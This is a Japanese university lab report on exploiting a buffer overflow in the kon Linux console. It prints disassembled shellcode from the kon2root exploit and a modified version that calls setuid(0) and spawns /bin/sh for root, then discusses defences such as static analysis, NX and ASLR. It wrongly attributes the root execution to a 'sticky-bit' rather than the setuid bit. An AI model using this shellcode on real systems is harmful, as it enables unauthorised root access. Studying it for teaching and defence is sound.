\chapter{システム攻撃・防御演習}

\section{概要}

システム攻撃・防御演習では、konに存在するバッファオーバーフローの脆弱性を利用してroot権限を奪取するexploitプログラムを解析し、その仕組みを理解した。

\section{実験内容}

kon（Kanji ON Linux console）
をインストールしたLinuxマシンを用意し、その上でkon2rootというexploitプログラムを実行した。しかし、root権限を奪取することはできなかった。そこで、kon2rootのソースコードを解析した結果、konのバッファオーバーフロー脆弱性を利用して、シェルコードを送り込んでいる部分を発見した。このシェルコードは機械語であったので、逆アセンブルしたところ、以下のようなアセンブリが得られた。

\begin{verbatim}
 // 2. へジャンプ
 8049668:   eb 1f                   jmp    8049689 <w00tI4r3l33t+0x29> 

// sys_execve:プログラムファイル（/bin/id）の実行                             //1.
 804966a:   5e                      pop    esi
 804966b:   89 76 08                mov    DWORD PTR [esi+8],esi
 804966e:   31 c0                   xor    eax,eax
 8049670:   88 46 07                mov    BYTE PTR [esi+7],al
 8049673:   89 46 0c                mov    DWORD PTR [esi+12],eax
 8049676:   b0 0b                   mov    al,0xb
 8049678:   89 f3                   mov    ebx,esi
 804967a:   8d 4e 08                lea    ecx,[esi+8]
 804967d:   8d 56 0c                lea    edx,[esi+12]
 8049680:   cd 80                   int    0x80
 
// sys_exit：exit
 8049682:   31 db                   xor    ebx,ebx
 8049684:   89 d8                   mov    eax,ebx
 8049686:   40                      inc    eax
 8049687:   cd 80                   int    0x80

// 1. をコール
 8049689:   e8 dc ff ff ff          call   804966a <w00tI4r3l33t+0xa>       // 2.
 804968e:   2f 62 69 6e 2f 69 64    db     "/bin/id"
\end{verbatim}

このシェルコードは、まずシステムコール\texttt{sys\_execve}
(システムコール番号:
0xb）を呼び出して\texttt{/bin/id}を起動し、その後にkonのプロセスを終了していることがわかる。konコマンドのバイナリの所有者はrootでありかつsticky-bitが設定されているため、実効UID
(euid）は0、つまりrootとして実行される。しかし、実UID（ruid）
はkonを実行した一般ユーザのままである。そこで権限を奪取するためには、実UIDを0に変更する必要がある。また、\texttt{id}コマンドを実行しただけではrootユーザに昇格しても何もできないので、シェルを開く必要がある。これらの変更点を加えたシェルコードの逆アセンブリが下記である。

\begin{verbatim}
//sys_setuid：User ID = 0（root）をセット
 8049660:   31 db                   xor    ebx,ebx
 8049662:   31 c0                   xor    eax,eax
 8049664:   b0 17                   mov    al,0x17
 8049666:   cd 80                   int    0x80
 
// 2. へジャンプ
 8049668:   eb 1f                   jmp    8049689 <w00tI4r3l33t+0x29> 

//sys_execve:プログラムファイル（bin.sh）の実行                           // 1.
 804966a:   5e                      pop    esi
 804966b:   89 76 08                mov    DWORD PTR [esi+8],esi
 804966e:   31 c0                   xor    eax,eax
 8049670:   88 46 07                mov    BYTE PTR [esi+7],al
 8049673:   89 46 0c                mov    DWORD PTR [esi+12],eax
 8049676:   b0 0b                   mov    al,0xb
 8049678:   89 f3                   mov    ebx,esi
 804967a:   8d 4e 08                lea    ecx,[esi+8]
 804967d:   8d 56 0c                lea    edx,[esi+12]
 8049680:   cd 80                   int    0x80
 
//sys_exit：exit
 8049682:   31 db                   xor    ebx,ebx
 8049684:   89 d8                   mov    eax,ebx
 8049686:   40                      inc    eax
 8049687:   cd 80                   int    0x80

// 1.をコール
 8049689:   e8 dc ff ff ff          call   804966a <w00tI4r3l33t+0xa>       //2.
 804968e:   2f 62 69 6e 2f 73 68    db     "/bin/sh"
\end{verbatim}

このシェルコードを実行するようにkon2rootのソースコードに変更を加え、実行した。

\section{実験結果}

修正したkon2rootを実行した結果、一般ユーザであるにも関わらず、rootユーザとしてでシェルを開くことに成功した。\texttt{whoami}コマンドや\texttt{id}コマンドで確認したところ、確かにroot権限を奪取できていることを確認した。

\section{考察}

バッファオーバーフローによる脆弱性は、今回の実験で確認したように、場合によっては任意のコードを実行できてしまう危険性を内包している。バッファオーバーフローを防ぐためには、プログラムの開発者側でできる対策とプログラムの使用者側でできる対策の2種類が存在する。

プログラムの開発者側でできる対策としては、まず、ソースコードの静的検査ツールを用いてバッファオーバーフローの危険があるコード部分を検出する方法がある。このような静的検査ツールとしては、Rats、ITS4、Coverity
Prevent、HP Fortify Static Code
Analyzerなどがあげられる。静的検査ツールはソースコードを分析し、\texttt{strcpy}などバッファオーバーフローを発生させる可能性のある関数の呼び出しを検知したり、実行フローを分析して潜在的な危険性を探知する。静的検査ツールを開発時に使用することで、バッファオーバーフローが発生する可能性を低減することができる。次にあげられる対策が、バッファオーバーフローが発生しないような言語を開発に使用することである。C\#、Java、Ruby、Pythonなどの言語は、基本的に生のポインタを使用することができない。また、配列アクセスの境界チェックを実行時に行う。このため、これらの言語を利用するとバッファオーバーフローの危険を大幅に減少させることができる。

プログラムの使用者側でできる対策として、NX（No eXecute）ビットやASLR
(Address Space Layout Randomization）
があげられる。これらはハードウェアあるいはOSの機能で、対応したハードウェアやOSを用意することで、プログラム自体に変更を加えることなく使用することができる。NXビットは、ヒープやスタックなどメモリの特定領域に対して、実行を禁止する属性を付与する機能である。これにより、スタック領域にシェルコードを送り込まれても、その実行を防ぐことができる。NXビットは対応したCPUを用意すれば、Linuxならバージョン2.6.8以降、WindowsならXP
SP2以降で有効になる。ASLRは、ヒープやスタックなどのメモリ上での位置をランダム化することにより、攻撃者によるリターンアドレスの推測を難しくするものである。ASLRはハードウェアによるサポートは必要なく、Linuxなら2.6.12以降、WindowsならVista以降で有効になる。
